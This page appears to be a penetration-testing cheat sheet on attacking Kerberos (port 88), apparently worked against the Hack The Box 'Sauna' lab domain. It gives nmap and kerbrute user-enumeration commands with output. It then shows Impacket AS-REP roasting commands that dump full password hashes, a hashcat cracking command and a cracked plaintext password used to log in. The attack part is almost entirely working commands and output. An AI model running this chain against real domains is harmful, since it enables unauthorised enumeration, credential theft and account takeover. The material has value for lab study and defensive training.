# Kerberos - TCP/UDP 88

Enumerate

```
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>
```

Example

```
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='EGOTISTICAL-BANK.LOCAL'" 10.129.107.121
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-04 11:21 EDT
Nmap scan report for 10.129.107.121
Host is up (0.085s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|_    administrator@EGOTISTICAL-BANK.LOCAL

Nmap done: 1 IP address (1 host up) scanned in 14.01 seconds

```

Enumerate kerberos users

```
kali@kali:~$ ~/tools/kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.129.107.121  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Example

```
kali@kali:~$ ~/tools/kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.129.107.121  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt  -t 1000

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/04/22 - Ronnie Flathers @ropnop

2022/05/04 16:30:18 >  Using KDC(s):
2022/05/04 16:30:18 >   10.129.107.121:88

2022/05/04 16:30:19 >  [+] VALID USERNAME:       administrator@EGOTISTICAL-BANK.LOCAL
2022/05/04 16:30:22 >  [+] VALID USERNAME:       hsmith@EGOTISTICAL-BANK.LOCAL
2022/05/04 16:30:22 >  [+] VALID USERNAME:       Administrator@EGOTISTICAL-BANK.LOCAL
2022/05/04 16:30:23 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2022/05/04 16:30:36 >  [+] VALID USERNAME:       Fsmith@EGOTISTICAL-BANK.LOCAL
2022/05/04 16:38:05 >  [+] VALID USERNAME:       sauna@EGOTISTICAL-BANK.LOCAL

            
2022/05/04 17:00:18 >  [+] VALID USERNAME:       FSmith@EGOTISTICAL-BANK.LOCAL
2022/05/04 17:00:18 >  [+] VALID USERNAME:       FSMITH@EGOTISTICAL-BANK.LOCAL
2022/05/04 17:01:52 >  Done! Tested 8295455 usernames (8 valid) in 1893.820 seconds

```

## ASPRoast

The ASREPRoast attack looks for users without Kerberos pre-authentication required. That means that anyone can send an AS\_REQ request to the KDC on behalf of any of those users, and receive an AS\_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.

```
/home/kali/impacket/build/scripts-3.9/GetNPUsers.py -dc-ip 10.129.107.121 -no-pass -usersfile sauna_users EGOTISTICAL-BANK.LOCAL/
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sauna doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:66107a2b24ef4b5914d230d773689814$deeaecac67621dd0fb1524f34073f56b68f97e106b7173971c8b9d312fc974c951c2c77994980993a9d934056cc40d1222868c869104875a57038421d15d53b008f60334259fe8ae9c90ccc13c19c047a4463fb99268d525e23bec040c6d2a4c90afb014a387f705ebed08a523e772076fc2d37536fa392546c93e12e98766c86cde1d15ac2a6e1ce6a366c024b18db83af3e13c2503820e19576d3e21bebbade7905f689f8812172eb6ca913142deb9af18b4b5c4956202f1ad3a43ebc4a4d9a7f156defb078be5a73889cdbd269e9633e9d0db639b9a5ddf67ab4c71b054c18a65cc38231bcb035be8d7f3d56a1c0e763d2eb39083ddba3ecbde0bbae40f6a
[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Save hash to file:

```
/home/kali/impacket/build/scripts-3.9/GetNPUsers.py -dc-ip 10.129.107.121 -no-pass -usersfile sauna_users EGOTISTICAL-BANK.LOCAL/ -format hashcat -outputfile hashes.asreproast
```

Cracking hash:

```
hashcat -m 18200 --force -a 0 hashes.asreproast /usr/share/wordlists/rockyou.txt 
```

Testing pass:

```
home/kali/impacket/build/scripts-3.9/GetNPUsers.py -dc-ip 10.129.107.121  EGOTISTICAL-BANK.LOCAL/fsmith:Thestrokes23 -request
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Name    MemberOf                                                            PasswordLastSet             LastLogon                   UAC      
------  ------------------------------------------------------------------  --------------------------  --------------------------  --------
FSmith  CN=Remote Management Users,CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL  2020-01-23 11:45:19.047096  2022-05-05 17:53:36.308784  0x410200 



$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:1957fad3578b11d29a41403d74ffb147$d7188570a0f00b6a04c07983d0f8eaf84937d4f9c1610f3174171da364f8654fd74f052447d0fe3452eac12862c7b7adf35b1a6df554ae0411655e06cdcb310a2f1c7626aea850d16d5627da009576ac0ac55d1a67e291864809cb1a56521fb5d1a8615d12553477a907f7149c5d1a82f83a732025ea0c37a58a32cb265cdcf3f3030b98ed860986194187e301d97dfe130540f254bcf866e545ad29391cbd0eb64ce163b4b5daa087f101ab9292b415fbf369a49ff26290ba709e8dfefe575d07e0a1556f1fe9c52765647b212e86e58b86755ee5e2d90aa6b40c0e3688c97a09c937f5423bcb3b8ace79f36e1fd3135e9cc2376648cc5f0f453492d2364051
kali@kali:~/htb$ 

```

{% hint style="info" %}
[https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#as-rep-roasting](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#as-rep-roasting)
{% endhint %}
